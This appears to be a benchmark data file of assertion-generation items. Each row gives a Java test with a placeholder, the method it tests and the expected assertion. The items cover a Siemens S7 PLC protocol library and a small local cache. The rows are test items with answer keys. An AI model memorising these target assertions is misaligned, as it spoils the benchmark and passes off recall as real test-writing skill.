"readRecombination() { // 1, 9, 102, 33, 2, 4, 8, 326, 2, 2, 2, 2, 2, 400, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 99 // 1, 9, 102, 33, 2, 4, 8, 13| 221| 92, 2, 2, 2, 2, 2, 64|221|115, 2, 2, 2, 2, 2, 2, 2, 2| 2, 2, 2, 99 int[] data = new int[]{1, 9, 102, 33, 2, 4, 8, 326, 2, 2, 2, 2, 2, 400, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 99}; int[] expect = new int[]{1, 9, 102, 33, 2, 4, 8, 13, 221, 92, 2, 2, 2, 2, 2, 64, 221, 115, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 99}; List<Integer> src = Arrays.stream(data).boxed().collect(Collectors.toList()); List<S7ComGroup> recombination = S7SequentialGroupAlg.readRecombination(src, 240 - 14, 5, 12); int[] actual = recombination.stream().flatMap(x -> x.getItems().stream()) .mapToInt(S7ComItem::getRipeSize).toArray(); ""<AssertPlaceHolder>""; //        System.out.println(Arrays.toString(actual)); //        recombination.forEach(x->{ //            x.getItems().forEach(y-> System.out.println(y.toString() + y.getTotalLength())); //            System.out.println(""----------------------------------------------------""); //        }); }
readRecombination(List<Integer> src, int targetSize, int extraSize, int threshold) { List<S7ComGroup> groupList = new LinkedList<>(); S7ComGroup group = new S7ComGroup(); groupList.add(group); int sum = 0; for (int i = 0; i < src.size(); i++) { int number = src.get(i); int offset = 0; while (number > 0) { S7ComItem item = new S7ComItem(i, src.get(i), offset, 0, extraSize, threshold); if (sum + number + item.getExtraSize() > targetSize) { item.setRipeSize(targetSize - sum - item.getExtraSize()); } else { item.setRipeSize(number); } sum += item.getTotalLength(); number -= item.getRipeSize(); offset += item.getRipeSize(); group.add(item); if (sum + threshold >= targetSize) { group = new S7ComGroup(); groupList.add(group); sum = 0; } } } return groupList.stream().filter(x -> !x.getItems().isEmpty()).collect(Collectors.toList()); }"	assertArrayEquals(expect, actual)
"readRecombination1() { int[] data = new int[]{2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2}; int[] expect = new int[]{2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2}; List<Integer> src = Arrays.stream(data).boxed().collect(Collectors.toList()); List<S7ComGroup> recombination = S7SequentialGroupAlg.readRecombination(src, 240 - 14, 5, 12); int[] actual = recombination.stream().flatMap(x -> x.getItems().stream()) .mapToInt(S7ComItem::getRipeSize).toArray(); ""<AssertPlaceHolder>""; }
readRecombination(List<Integer> src, int targetSize, int extraSize, int threshold) { List<S7ComGroup> groupList = new LinkedList<>(); S7ComGroup group = new S7ComGroup(); groupList.add(group); int sum = 0; for (int i = 0; i < src.size(); i++) { int number = src.get(i); int offset = 0; while (number > 0) { S7ComItem item = new S7ComItem(i, src.get(i), offset, 0, extraSize, threshold); if (sum + number + item.getExtraSize() > targetSize) { item.setRipeSize(targetSize - sum - item.getExtraSize()); } else { item.setRipeSize(number); } sum += item.getTotalLength(); number -= item.getRipeSize(); offset += item.getRipeSize(); group.add(item); if (sum + threshold >= targetSize) { group = new S7ComGroup(); groupList.add(group); sum = 0; } } } return groupList.stream().filter(x -> !x.getItems().isEmpty()).collect(Collectors.toList()); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { COTPConnection connection = new COTPConnection(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(18, connection.byteArrayLength())
"toByteArray() { COTPConnection connection = COTPConnection.crConnectRequest(0x0100,0x0100); byte[] actual = connection.toByteArray(); byte[] expect = {(byte) 0x11, (byte) 0xE0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0xC0, (byte) 0x01, (byte) 0x0A, (byte) 0xC1, (byte) 0x02, (byte) 0x01, (byte) 0x00, (byte) 0xC2, (byte) 0x02, (byte) 0x01, (byte) 0x00};  ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.length) .putByte(this.pduType.getCode()) .putShort(this.destinationReference) .putShort(this.sourceReference) .putByte(this.flags) .putByte(this.parameterCodeTpduSize) .putByte(this.parameterLength1) .putByte(this.tpduSize) .putByte(this.parameterCodeSrcTsap) .putByte(this.parameterLength2) .putShort(this.sourceTsap) .putByte(this.parameterCodeDstTsap) .putByte(this.parameterLength3) .putShort(this.destinationTsap) .getData(); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { COTPData cotpData = new COTPData(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(3, cotpData.byteArrayLength())
"toByteArray() { COTPData cotpData = new COTPData(); cotpData.setLength((byte) 0x11); cotpData.setPduType(EPduType.CONNECT_REQUEST); cotpData.setTpduNumber((byte) 0x01); cotpData.setLastDataUnit(true); byte[] actual = cotpData.toByteArray(); byte[] expect = {(byte) 0x11, (byte)0xE0, (byte)0x81}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.length) .putByte(this.pduType.getCode()) // TPDU编号和是否最后一个数据单元组合成一个字节，最高位表示是否最后一个 .putByte((byte) (BooleanUtil.setBit((byte) 0x00, 7, this.lastDataUnit) | (this.tpduNumber & 0xFF))) .getData(); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { COTP cotp = new COTP(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return 2; }"	assertEquals(2, cotp.byteArrayLength())
"toByteArray() { COTP cotp = new COTP(); cotp.setLength((byte) 0x03); cotp.setPduType(EPduType.CONNECT_CONFIRM); byte[] target = new byte[]{(byte) 0x03, (byte) 0xD0}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(2) .putByte(this.length) .putByte(this.pduType.getCode()) .getData(); }"	assertArrayEquals(target, cotp.toByteArray())
"byteArrayLength() { DataItem dataItem = new DataItem(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return 4 + this.data.length; }"	assertEquals(4, dataItem.byteArrayLength())
"toByteArray() { DataItem dataItem = new DataItem(); dataItem.setReturnCode(EReturnCode.from((byte) 0xFF)); dataItem.setVariableType(EDataVariableType.BYTE_WORD_DWORD); dataItem.setCount(1); dataItem.setData(new byte[1]); byte[] actual = dataItem.toByteArray(); byte[] expect = {(byte) 0xFF, (byte) 0x04, (byte) 0x00, (byte) 0x08, (byte) 0x00}; ""<AssertPlaceHolder>""; }
toByteArray() { int length = 4 + this.data.length; ByteWriteBuff buff = ByteWriteBuff.newInstance(length) .putByte(this.returnCode.getCode()) .putByte(this.variableType.getCode()); // 如果数据类型是位，不需要 * 8，如果是其他类型，需要 * 8 switch (this.variableType) { case NULL: case BYTE_WORD_DWORD: case INTEGER: buff.putShort(this.count * 8); break; case BIT: case DINTEGER: case REAL: case OCTET_STRING: buff.putShort(this.count); break; default: throw new S7CommException(""Data type not recognized""); } buff.putBytes(this.data); return buff.getData(); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { DataItem dataItem = new DataItem(); ReadWriteDatum datum = new ReadWriteDatum(); datum.getReturnItems().add(dataItem); ""<AssertPlaceHolder>""; }
byteArrayLength() { return 0; }"	assertEquals(4, datum.byteArrayLength())
"toByteArray() { DataItem dataItem = new DataItem(); dataItem.setReturnCode(EReturnCode.from((byte) 0xFF)); dataItem.setVariableType(EDataVariableType.BYTE_WORD_DWORD); dataItem.setCount(1); dataItem.setData(new byte[1]); ReadWriteDatum datum = new ReadWriteDatum(); datum.getReturnItems().add(dataItem); byte[] actual = datum.toByteArray(); byte[] expect = {(byte) 0xFF, (byte) 0x04, (byte) 0x00, (byte) 0x08, (byte) 0x00}; ""<AssertPlaceHolder>""; }
toByteArray() { return new byte[0]; }"	assertArrayEquals(expect, actual)
"byteArrayLength() { Header header = new Header(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(10, header.byteArrayLength())
"toByteArray() { Header header = new Header(); header.setProtocolId((byte) 0x32); header.setMessageType(EMessageType.JOB); header.setReserved(0x0000); header.setPduReference(0x0000); header.setParameterLength(0x0000); header.setDataLength(0x0002); //        header.setErrorClass(EErrorClass.NO_ERROR); //        header.setErrorCode((byte) 0x00); byte[] actual = header.toByteArray(); //        byte[] expect = new byte[]{(byte) 0x32, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x02, (byte) 0x00, (byte) 0x00}; byte[] expect = new byte[]{(byte) 0x32, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x02}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.protocolId) .putByte(this.messageType.getCode()) .putShort(this.reserved) .putShort(this.pduReference) .putShort(this.parameterLength) .putShort(this.dataLength) .getData(); }"	assertArrayEquals(expect, actual)
"toByteArray1() { AckHeader header = new AckHeader(); header.setProtocolId((byte) 0x32); header.setMessageType(EMessageType.JOB); header.setReserved(0x0000); header.setPduReference(0x0000); header.setParameterLength(0x0000); header.setDataLength(0x0002); header.setErrorClass(EErrorClass.NO_ERROR); header.setErrorCode((byte) 0x00); byte[] actual = header.toByteArray(); byte[] expect = new byte[]{(byte) 0x32, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x02, (byte) 0x00, (byte) 0x00}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.protocolId) .putByte(this.messageType.getCode()) .putShort(this.reserved) .putShort(this.pduReference) .putShort(this.parameterLength) .putShort(this.dataLength) .getData(); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { PlcControlParameter parameter = new PlcControlParameter(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return 1 + 7 + 2 + this.parameterBlockLength + 1 + this.lengthPart; }"	assertEquals(11, parameter.byteArrayLength())
"toByteArray() { PlcControlParameter parameter = new PlcControlParameter(); parameter.setParameterBlock(new PlcControlStringParamBlock()); parameter.setPiService(PlcControlParameter.P_PROGRAM); byte[] actual = parameter.toByteArray(); byte[] expect = {(byte) 0x28, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xFD, (byte) 0x00, (byte) 0x00, (byte) 0x09, (byte) 0x50, (byte) 0x5f, (byte) 0x50, (byte) 0x52, (byte) 0x4F, (byte) 0x47, (byte) 0x52, (byte) 0x41, (byte) 0x4D}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(1 + 7 + 2 + this.parameterBlockLength + 1 + this.lengthPart) .putByte(this.functionCode.getCode()) .putBytes(this.unknownBytes) .putShort(this.parameterBlockLength) .putBytes(this.parameterBlock.toByteArray()) .putByte(this.lengthPart) .putString(this.piService) .getData(); }"	assertArrayEquals(expect, actual)
"insert() { byte[] expect = {(byte) 0x28, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xFD, (byte) 0x00, (byte) 0x0A, (byte) 0x01, (byte) 0x00, (byte) 0x30, (byte) 0x41, (byte) 0x30, (byte) 0x30, (byte) 0x30, (byte) 0x30, (byte) 0x31, (byte) 0x50, (byte) 0x05, (byte) 0x5F, (byte) 0x49, (byte) 0x4e, (byte) 0x53, (byte) 0x45};  PlcControlParameter insert = PlcControlParameter.insert(EFileBlockType.DB, 1, EDestinationFileSystem.P); ""<AssertPlaceHolder>"";  }
toByteArray() { return ByteWriteBuff.newInstance(1 + 7 + 2 + this.parameterBlockLength + 1 + this.lengthPart) .putByte(this.functionCode.getCode()) .putBytes(this.unknownBytes) .putShort(this.parameterBlockLength) .putBytes(this.parameterBlock.toByteArray()) .putByte(this.lengthPart) .putString(this.piService) .getData(); }"	assertArrayEquals(expect, insert.toByteArray())
"byteArrayLength() { PlcStopParameter parameter = new PlcStopParameter(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return 7 + this.lengthPart; }"	assertEquals(7, parameter.byteArrayLength())
"toByteArray() { PlcStopParameter parameter = new PlcStopParameter(); parameter.setPiService(""P_PROGRAM""); byte[] actual = parameter.toByteArray(); byte[] expect = {(byte) 0x29, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x09, (byte) 0x50, (byte) 0x5f, (byte) 0x50, (byte) 0x52, (byte) 0x4F, (byte) 0x47, (byte) 0x52, (byte) 0x41, (byte) 0x4D}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(7 + this.lengthPart) .putByte(this.functionCode.getCode()) .putBytes(this.unknownBytes) .putByte(this.lengthPart) .putString(this.piService) .getData(); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { RequestItem requestItem = new RequestItem(); ReadWriteParameter readWriteParameter = new ReadWriteParameter(); readWriteParameter.getRequestItems().add(requestItem); ""<AssertPlaceHolder>""; }
byteArrayLength() { return 2 + this.requestItems.stream().mapToInt(RequestBaseItem::byteArrayLength).sum(); }"	assertEquals(14, readWriteParameter.byteArrayLength())
"toByteArray() { RequestItem requestItem = new RequestItem(); requestItem.setSpecificationType((byte) 0x12); requestItem.setLengthOfFollowing((byte) 0x10); requestItem.setSyntaxId(ESyntaxID.S7ANY); requestItem.setVariableType(EParamVariableType.BYTE); requestItem.setCount(7); requestItem.setDbNumber(7); requestItem.setArea(EArea.DATA_BLOCKS); requestItem.setByteAddress(3); requestItem.setBitAddress(1); ReadWriteParameter readWriteParameter = new ReadWriteParameter(); readWriteParameter.setFunctionCode(EFunctionCode.READ_VARIABLE); readWriteParameter.setItemCount((byte) 0x01); readWriteParameter.getRequestItems().add(requestItem); byte[] actual = readWriteParameter.toByteArray(); byte[] expect = new byte[]{(byte) 0x04, (byte) 0x01, (byte) 0x12, (byte) 0x10, (byte) 0x10, (byte) 0x02, (byte) 0x00, (byte) 0x07, (byte) 0x00, (byte) 0x07, (byte) 0x84, (byte) 0x00, (byte) 0x00, (byte) 0x19}; ""<AssertPlaceHolder>""; }
toByteArray() { int length = 2 + this.requestItems.stream().mapToInt(RequestBaseItem::byteArrayLength).sum(); ByteWriteBuff buff = ByteWriteBuff.newInstance(length) .putByte(this.functionCode.getCode()) .putByte(this.itemCount); for (RequestBaseItem requestItem : this.requestItems) { buff.putBytes(requestItem.toByteArray()); } return buff.getData(); }"	assertArrayEquals(expect, actual)
"byteArrayLength() { RequestItem requestItem = new RequestItem(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(12, requestItem.byteArrayLength())
"toByteArray() { RequestItem requestItem = new RequestItem(); requestItem.setSpecificationType((byte)0x12); requestItem.setLengthOfFollowing((byte)0x10); requestItem.setSyntaxId(ESyntaxID.S7ANY); requestItem.setVariableType(EParamVariableType.BYTE); requestItem.setCount(7); requestItem.setDbNumber(7); requestItem.setArea(EArea.DATA_BLOCKS); requestItem.setByteAddress(3); requestItem.setBitAddress(1); byte[] actual = requestItem.toByteArray(); byte[] expect = new byte[]{(byte) 0x12, (byte) 0x10, (byte) 0x10, (byte) 0x02, (byte) 0x00, (byte) 0x07, (byte) 0x00, (byte) 0x07, (byte) 0x84, (byte) 0x00, (byte) 0x00, (byte) 0x19}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.specificationType) .putByte(this.lengthOfFollowing) .putByte(this.syntaxId.getCode()) .putByte(this.variableType.getCode()) .putShort(this.count) .putShort(this.dbNumber) .putByte(this.area.getCode()) // 只有3个字节，因此只取后面的3字节，第一个字节舍弃 .putBytes(IntegerUtil.toByteArray((this.byteAddress << 3) + this.bitAddress), 1) .getData(); }"	assertArrayEquals(expect, actual)
"createConnectRequest() { S7Data s7Data = S7Data.createConnectRequest(0x0100, 0x0100); ""<AssertPlaceHolder>""; }
byteArrayLength() { int length = 0; length += this.tpkt != null ? this.tpkt.byteArrayLength() : 0; length += this.cotp != null ? this.cotp.byteArrayLength() : 0; length += this.header != null ? this.header.byteArrayLength() : 0; length += this.parameter != null ? this.parameter.byteArrayLength() : 0; length += this.datum != null ? this.datum.byteArrayLength() : 0; return length; }"	assertEquals(22, s7Data.byteArrayLength())
"downloadData() { S7Data download = S7Data.createDownload(EFileBlockType.DB, 1, EDestinationFileSystem.P, true, new byte[10]); byte[] bytes = download.toByteArray(); ""<AssertPlaceHolder>""; }
toByteArray() { ByteWriteBuff buff = ByteWriteBuff.newInstance(this.byteArrayLength()); if (this.tpkt != null) { buff.putBytes(this.tpkt.toByteArray()); } if (this.cotp != null) { buff.putBytes(this.cotp.toByteArray()); } if (this.header != null) { buff.putBytes(this.header.toByteArray()); } if (this.parameter != null) { buff.putBytes(this.parameter.toByteArray()); } if (this.datum != null) { buff.putBytes(this.datum.toByteArray()); } return buff.getData(); }"	assertEquals(49,bytes.length)
"byteArrayLength() { SetupComParameter setupComParameter = new SetupComParameter(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(8, setupComParameter.byteArrayLength())
"toByteArray() { SetupComParameter setupComParameter = new SetupComParameter(); setupComParameter.setFunctionCode(EFunctionCode.READ_VARIABLE); setupComParameter.setReserved((byte) 0x00); setupComParameter.setMaxAmqCaller(0x0001); setupComParameter.setMaxAmqCallee(0x0001); setupComParameter.setPduLength(0x0004); byte[] actual = setupComParameter.toByteArray(); byte[] expect = {(byte) 0x04, (byte) 0x00, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x04}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.functionCode.getCode()) .putByte(this.reserved) .putShort(this.maxAmqCaller) .putShort(this.maxAmqCallee) .putShort(this.pduLength) .getData(); }"	assertArrayEquals(expect, actual)
"parameter() { Parameter parameter = new SetupComParameter(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(SetupComParameter.BYTE_LENGTH, parameter.byteArrayLength())
"byteArrayLength() { TPKT tpkt = new TPKT(); ""<AssertPlaceHolder>""; }
byteArrayLength() { return BYTE_LENGTH; }"	assertEquals(4, tpkt.byteArrayLength())
"toByteArray() { TPKT tpkt = new TPKT(); tpkt.setLength(100); byte[] actual = tpkt.toByteArray(); byte[] expect = {(byte) 0x03, (byte) 0x00, (byte) 0x00, (byte) 0x64}; ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(BYTE_LENGTH) .putByte(this.version) .putByte(this.reserved) .putShort(this.length) .getData(); }"	assertArrayEquals(expect, actual)
"writeByte() { s7PLC.writeByte(""DB2.0"", (byte) 0x11); byte actual = s7PLC.readByte(""DB2.0""); ""<AssertPlaceHolder>""; }
readByte(String address) { return this.readByte(address, 1)[0]; }"	assertEquals((byte) 0x11, actual)
"writeString() { //        s7PLC.writeString(""DB1.80"", ""1234567""); s7PLC.writeString(""DB4.304"", ""百搭利器""); String str = s7PLC.readString(""DB4.304""); ""<AssertPlaceHolder>""; }
readString(String address) { int offset = this.plcType == EPlcType.S200_SMART ? 1 : 2; DataItem dataItem = this.readS7Data(AddressUtil.parseByte(address, offset)); int length = ByteUtil.toUInt8(dataItem.getData(), offset - 1); dataItem = this.readS7Data(AddressUtil.parseByte(address, offset + length)); return ByteUtil.toStr(dataItem.getData(), offset, length, Charset.forName(""GB2312"")); }"	"assertEquals(""百搭利器"", str)"
"writeStringS200Smart() { s7PLC.writeString(""V10"", ""手动反馈和搜狐""); String str = s7PLC.readString(""V10""); ""<AssertPlaceHolder>""; }
readString(String address) { int offset = this.plcType == EPlcType.S200_SMART ? 1 : 2; DataItem dataItem = this.readS7Data(AddressUtil.parseByte(address, offset)); int length = ByteUtil.toUInt8(dataItem.getData(), offset - 1); dataItem = this.readS7Data(AddressUtil.parseByte(address, offset + length)); return ByteUtil.toStr(dataItem.getData(), offset, length, Charset.forName(""GB2312"")); }"	"assertEquals(""手动反馈和搜狐"", str)"
"writeTime() { s7PLC.writeTime(""DB4.292"", 1000); long actual = s7PLC.readTime(""DB4.292""); ""<AssertPlaceHolder>""; }
readTime(String address) { return this.readUInt32(address); }"	assertEquals(1000, actual)
"writeDate() { LocalDate expect = LocalDate.of(2023, 4, 1); s7PLC.writeDate(""DB4.296"", expect); LocalDate actual = s7PLC.readDate(""DB4.296""); ""<AssertPlaceHolder>""; }
readDate(String address) { int offset = this.readUInt16(address); return LocalDate.of(1990, 1, 1).plusDays(offset); }"	assertEquals(expect, actual)
"writeTimeOfDay() { LocalTime expect = LocalTime.of(20, 15, 11); s7PLC.writeTimeOfDay(""DB4.298"", expect); LocalTime actual = s7PLC.readTimeOfDay(""DB4.298""); ""<AssertPlaceHolder>""; }
readTimeOfDay(String address) { long value = this.readUInt32(address); return LocalTime.ofSecondOfDay(value / 1000); }"	assertEquals(expect, actual)
"writeDTL() { LocalDateTime expect = LocalDateTime.of(2023, 5, 27, 12, 11, 22, 333225555); s7PLC.writeDTL(""DB1.0"", expect);  LocalDateTime actual = s7PLC.readDTL(""DB1.0""); ""<AssertPlaceHolder>""; }
readDTL(String address) { byte[] bytes = this.readByte(address, 12); ByteReadBuff buff = ByteReadBuff.newInstance(bytes); int year = buff.getUInt16(); int month = buff.getByteToInt(); int dayOfMonth = buff.getByteToInt(); int week = buff.getByteToInt(); int hour = buff.getByteToInt(); int minute = buff.getByteToInt(); int second = buff.getByteToInt(); long nanoOfSecond = buff.getUInt32(); return LocalDateTime.of(year, month, dayOfMonth, hour, minute, second, (int) nanoOfSecond); }"	assertEquals(expect, actual)
"writeI() { s7PLC.writeBoolean(""I0.5"", true);  List<Boolean> booleans = s7PLC.readBoolean(""I0.0"", ""I0.1"", ""I0.2"", ""I0.3"", ""I0.4"", ""I0.5""); ""<AssertPlaceHolder>""; System.out.println(booleans);  }
writeBoolean(String address, boolean data) { this.writeS7Data(AddressUtil.parseBit(address), DataItem.createReqByBoolean(data)); }"	assertEquals(6, booleans.size())
"listToByteArrayTest() { byte[] expect = new byte[]{(byte) 0x55, 0x05}; List<Boolean> booleans = new ArrayList<>(); for (int i = 0; i < 12; i++) { booleans.add(i % 2 == 0); } byte[] bytes = BooleanUtil.listToByteArray(booleans); ""<AssertPlaceHolder>""; }
listToByteArray(List<Boolean> list) { if (list == null || list.isEmpty()) { throw new IllegalArgumentException(""list is null or empty""); } int index = 0; byte[] values = new byte[(list.size() / 8) + (list.size() % 8 == 0 ? 0 : 1)]; for (int i = 0; i < values.length; i++) { for (int j = 0; j < 8; j++) { if (index < list.size()) { values[i] = BooleanUtil.setBit(values[i], j, list.get(index)); index++; } } } return values; }"	assertArrayEquals(expect, bytes)
"toByte() { byte actual = ByteUtil.toByte(11); ""<AssertPlaceHolder>""; }
toByte(int data) { return (byte) (data & 0xFF); }"	assertEquals((byte) 0x0B, actual)
"toStr() { byte[] data = {(byte) 0x50, (byte) 0x5f, (byte) 0x50, (byte) 0x52, (byte) 0x4F, (byte) 0x47, (byte) 0x52, (byte) 0x41, (byte) 0x4D}; String actual = ByteUtil.toStr(data); ""<AssertPlaceHolder>""; }
toStr(byte[] data) { return toStr(data, 0, data.length, StandardCharsets.US_ASCII); }"	"assertEquals(""P_PROGRAM"", actual)"
"toHexArray_One() { byte[] bytes = HexUtil.toHexArray(""1A""); ""<AssertPlaceHolder>""; }
toHexArray(String src) { if (src == null || src.length() == 0) { // 字符串不能为null或长度不能为0 throw new HexParseException(""The string cannot be null or the length cannot be 0""); } if ((src.length() & -src.length()) == 1) { // 输入的字符串个数必须为偶数 throw new HexParseException(""The number of strings entered must be an even number""); } if (!src.matches(REGEX)) { // 字符串内容必须是[0-9|a-f|A-F] throw new HexParseException(""The string content must be [0-9|a-f|A-F].""); }  char[] chars = src.toCharArray(); final byte[] out = new byte[chars.length >> 1]; for (int i = 0; i < chars.length; i = i + 2) { int high = Character.digit(chars[i], 16) << 4; int low = Character.digit(chars[i + 1], 16); out[i / 2] = (byte) ((high | low) & 0xFF); } return out; }"	assertEquals(0x1A, bytes[0])
"toHexArray_Multi() { byte[] actual = HexUtil.toHexArray(""1a6BdE8c""); byte[] expected = new byte[]{(byte) 0x1A, (byte) 0x6B, (byte) 0xDE, (byte) 0x8C}; ""<AssertPlaceHolder>""; }
toHexArray(String src) { if (src == null || src.length() == 0) { // 字符串不能为null或长度不能为0 throw new HexParseException(""The string cannot be null or the length cannot be 0""); } if ((src.length() & -src.length()) == 1) { // 输入的字符串个数必须为偶数 throw new HexParseException(""The number of strings entered must be an even number""); } if (!src.matches(REGEX)) { // 字符串内容必须是[0-9|a-f|A-F] throw new HexParseException(""The string content must be [0-9|a-f|A-F].""); }  char[] chars = src.toCharArray(); final byte[] out = new byte[chars.length >> 1]; for (int i = 0; i < chars.length; i = i + 2) { int high = Character.digit(chars[i], 16) << 4; int low = Character.digit(chars[i + 1], 16); out[i / 2] = (byte) ((high | low) & 0xFF); } return out; }"	assertArrayEquals(expected, actual)
"toByteArray1() { byte[] actual = IntegerUtil.toByteArray(2111286, true); byte[] expect = new byte[]{(byte) 0x36, (byte) 0x37, (byte) 0x20, (byte) 0x00}; ""<AssertPlaceHolder>""; }
toByteArray(int data, boolean littleEndian) { byte[] bytes = new byte[4];  if (littleEndian) { bytes[0] = (byte) ((data) & 0xFF); bytes[1] = (byte) ((data >> 8) & 0xFF); bytes[2] = (byte) ((data >> 16) & 0xFF); bytes[3] = (byte) ((data >> 24) & 0xFF); } else { bytes[0] = (byte) ((data >> 24) & 0xFF); bytes[1] = (byte) ((data >> 16) & 0xFF); bytes[2] = (byte) ((data >> 8) & 0xFF); bytes[3] = (byte) ((data) & 0xFF); } return bytes; }"	assertArrayEquals(expect, actual)
"lrcTest() { byte[] src = new byte[]{0x01, 0x03, 0x00, 0x00, 0x00, 0x14}; byte actual = LRCUtil.lrc(src); ""<AssertPlaceHolder>""; }
lrc(byte[] src) { if (src == null || src.length == 0) { throw new IllegalArgumentException(""src""); }  int sum = 0; for (byte b : src) { sum += b; } sum = sum % 256; sum = 256 - sum; return (byte) sum; }"	assertEquals((byte) 0xE8, actual)
"lrcTest1() { byte[] src = new byte[]{0x01, 0x03, 0x00, 0x00, 0x00, 0x14}; boolean actual = LRCUtil.lrc(src, (byte) 0xE8); ""<AssertPlaceHolder>""; }
lrc(byte[] src, byte target) { byte des = lrc(src); return des == target; }"	assertTrue(actual)
"toByteArray1() { byte[] actual = ShortUtil.toByteArray(24565, true); byte[] expect = new byte[]{(byte) 0xF5, (byte) 0x5F}; ""<AssertPlaceHolder>""; }
toByteArray(int data, boolean littleEndian) { byte[] bytes = new byte[2];  if (littleEndian) { bytes[0] = (byte) (data & 0xFF); bytes[1] = (byte) (data >> 8 & 0xFF); } else { bytes[0] = (byte) (data >> 8 & 0xFF); bytes[1] = (byte) (data & 0xFF); } return bytes; }"	assertArrayEquals(expect, actual)
"getUTCTotalSecond() { LocalDateTime dateTime = LocalDateTime.of(1970, 1, 1, 0, 0, 3); long second = TimesUtil.getUTCTotalSecond(dateTime); ""<AssertPlaceHolder>""; }
getUTCTotalSecond(LocalDateTime dateTime) { Duration between = Duration.between(getUTCOriginDateTime(), dateTime); return between.getSeconds(); }"	assertEquals(3, second)
"set() { JapCache japCache = new JapLocalCache(); japCache.set(""key"", ""value""); String value = (String) japCache.get(""key""); Assert.""<AssertPlaceHolder>""; }
get(String key) { if (StrUtil.isEmpty(key)) { return null; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); if (null == cacheObj || cacheObj.isExpired()) { return null; } return cacheObj.getData(); } finally { readLock.unlock(); } }"	"assertEquals(""value"", value)"
"set2() { JapCache japCache = new JapLocalCache(); japCache.set(""key"", ""value"", 10000); String value = (String) japCache.get(""key""); Assert.""<AssertPlaceHolder>""; }
get(String key) { if (StrUtil.isEmpty(key)) { return null; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); if (null == cacheObj || cacheObj.isExpired()) { return null; } return cacheObj.getData(); } finally { readLock.unlock(); } }"	"assertEquals(""value"", value)"
"getByNullKey() { JapCache japCache = new JapLocalCache(); String res = (String) japCache.get(null); Assert.""<AssertPlaceHolder>""; }
get(String key) { if (StrUtil.isEmpty(key)) { return null; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); if (null == cacheObj || cacheObj.isExpired()) { return null; } return cacheObj.getData(); } finally { readLock.unlock(); } }"	assertNull(res)
"getByEmptyKey() { JapCache japCache = new JapLocalCache(); String res = (String) japCache.get(""""); Assert.""<AssertPlaceHolder>""; }
get(String key) { if (StrUtil.isEmpty(key)) { return null; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); if (null == cacheObj || cacheObj.isExpired()) { return null; } return cacheObj.getData(); } finally { readLock.unlock(); } }"	assertNull(res)
"getByNotEmptyKey() { JapCache japCache = new JapLocalCache(); String res = (String) japCache.get(""ke1y""); System.out.println(res); Assert.""<AssertPlaceHolder>""; }
get(String key) { if (StrUtil.isEmpty(key)) { return null; } readLock.lock(); try { CacheObj cacheObj = LOCAL_CACHE.get(key); if (null == cacheObj || cacheObj.isExpired()) { return null; } return cacheObj.getData(); } finally { readLock.unlock(); } }"	assertNull(res)
